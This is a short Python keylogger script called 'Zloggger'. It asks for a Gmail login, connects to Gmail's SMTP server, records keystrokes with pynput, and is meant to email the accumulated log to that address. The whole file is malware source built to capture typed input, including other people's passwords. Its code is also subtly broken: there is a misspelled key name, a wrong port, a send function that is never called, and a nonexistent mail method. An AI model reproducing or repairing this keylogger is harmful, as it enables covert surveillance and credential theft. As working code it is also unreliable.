from pynput.keyboard import Key, Listener
import threading
import getpass
import smtplib

import smtplib
from pyfiglet import Figlet
custom_fig = Figlet(font='graffiti')
print(custom_fig.renderText('Zloggger!!'))

email =input('Enter Your Email:')
password = getpass.getpass(prompt='password:', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 534)
server.login(email, password)


full_log= ""
word = ""
email_char__limit = 50

def on_press(Key):
    global word
    global full_log
    global email
    global email_char__limit

    if Key == Key.space or Key == Key.enter:
        word+= ' '
        full_log +=word 
        word = ''
        if len(full_log) >= email_char__limit:
            send_log =' '
    elif Key == Key.shit_1 or Key == Key.shift_r:
        return

    elif Key == Key.backspace:
        word = word [:-1]

    else:
        char = f'{Key}'
        char = char [1:-1]
        word += char

    if Key == Key.esc:
        return False

def send_log():
    server.sendemail(
        email,
        email,
        full_log
    )                

with Listener(on_press=on_press) as Listener:
    Listener.join()   